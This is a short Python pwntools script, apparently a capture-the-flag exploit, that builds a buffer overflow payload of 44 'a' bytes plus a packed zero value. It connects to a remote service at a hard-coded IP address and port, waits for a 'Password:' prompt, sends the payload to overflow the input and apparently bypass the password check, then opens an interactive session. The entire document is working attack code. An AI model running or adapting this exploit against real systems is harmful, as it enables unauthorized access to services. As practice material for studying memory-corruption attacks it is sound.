from pwn import *
import re, sys
import struct
import time

exploit = "a"*44
exploit += p64(0)

print exploit

conn = remote('52.71.70.98' ,2091)

raw_input()

line = conn.recvuntil('Password:')
print line
conn.send(exploit+'\n')

conn.interactive()
